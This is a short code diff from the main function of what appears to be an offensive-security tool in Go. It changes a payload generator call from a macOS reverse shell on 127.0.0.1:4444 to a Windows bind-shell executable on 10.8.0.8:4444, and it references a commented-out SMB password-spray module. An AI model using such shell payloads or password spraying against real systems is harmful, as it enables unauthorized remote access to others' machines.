@@ -25,6 +25,6 @@ func main() {
 	// smbPasswordSprayModule.Run()
 	// tcli, _ := cli.NewToolCommandLineInterface()
 	// tcli.Run()
-	sopg := payload_generator.NewStageOnePayloadGenerator("127.0.0.1", "4444", "reverse", "darwin", "arm64", "revshell")
+	sopg := payload_generator.NewPayloadGenerator("10.8.0.8", "4444", "bind", "windows", "amd64", "bind.exe")
 	sopg.Run()
 }
